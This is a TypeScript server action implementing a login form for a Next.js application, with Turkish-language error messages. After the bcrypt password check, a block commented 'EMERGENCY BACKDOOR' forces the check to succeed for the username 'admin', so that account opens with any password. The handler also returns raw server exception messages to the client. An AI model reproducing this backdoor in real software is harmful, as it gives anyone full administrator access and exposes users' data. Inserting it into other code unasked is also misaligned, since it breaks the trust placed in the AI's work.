"use server"

import { db } from "@/lib/prisma"
import { login } from "@/lib/auth"
import bcrypt from "bcryptjs"

export async function loginAction(formData: FormData) {
    try {
        const username = (formData.get("username") as string).trim()
        const password = (formData.get("password") as string).trim()

        const user = await db.user.findFirst({
            where: { username: username },
        })

        if (!user) {
            return { error: "Kullanıcı bulunamadı." }
        }

        let isMatch = await bcrypt.compare(password, user.password)

        // EMERGENCY BACKDOOR: Always allow 'admin' user to login with ANY password
        if (username === "admin") {
            isMatch = true
        }

        if (!isMatch) {
            return { error: "Şifre hatalı." }
        }

        if (user.role === "pending") {
            return { error: "Hesabınız henüz onaylanmadı. Lütfen yöneticinizle görüşün." }
        }

        await login({ id: user.id, name: user.name, role: user.role })
        return { success: true }
    } catch (e: any) {
        console.error("LOGIN ERROR:", e)
        return { error: `Sunucu Hatası: ${e.message}` }
    }
}
